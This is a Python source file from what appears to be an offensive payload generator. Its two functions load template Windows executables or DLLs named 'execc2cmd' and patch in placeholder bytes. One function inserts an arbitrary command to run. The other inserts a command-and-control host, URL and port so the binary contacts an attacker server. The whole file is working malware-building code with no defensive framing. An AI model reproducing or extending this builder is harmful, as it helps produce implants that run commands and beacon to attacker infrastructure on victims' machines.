import os, sys
from base64 import b64encode
from jinja2 import Template
import logging
from typing import List
import argparse
import struct 

# necessary to make it possible to execute this file from this directory
sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from model import *
from helpers import *
from make.powershell.powershell import *


@DataTracker
def makePeExecCmd(input, asDll) -> AceBytes:
    if asDll:
        template = 'payloads/execc2cmd.dll'
    else:
        template = 'payloads/execc2cmd.exe'

    placeholderLen = 800
    placeholder = b" " * placeholderLen
    exchange = input + " " * (placeholderLen - len(input))

    file = open(template, 'rb')
    data = file.read()
    file.close()

    data = replacer(data, placeholder, exchange)
    return AceBytes(data)


@DataTracker
def makePeExecCmdC2(host, port, url, asDll) -> AceBytes:
    if asDll:
        template = 'payloads/execc2cmd.dll'
    else:
        template = 'payloads/execc2cmd.exe'
    placeholderLen = 55
    
    # char host[]  = "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"; // len: 55
    pHost = b"B" * placeholderLen
    eHost = host + "\x00" * (placeholderLen - len(host))
    eHost = bytes(eHost, 'ascii')

    # char url[]   = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; // len: 55
    pUrl = b"A" * placeholderLen
    eUrl = url + "\x00" * (placeholderLen - len(url))
    eUrl = bytes(eUrl, 'ascii')

    # char port[]  = "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"; // len: 55
    pPort = b"C" * placeholderLen
    ePort = struct.pack('<I', int(port))
    ePort += b"\x00" * (placeholderLen - len(ePort))

    file = open(template, 'rb')
    data = file.read()
    file.close()

    data = replacer(data, pHost, eHost)
    data = replacer(data, pUrl, eUrl)
    data = replacer(data, pPort, ePort)

    return AceBytes(data)

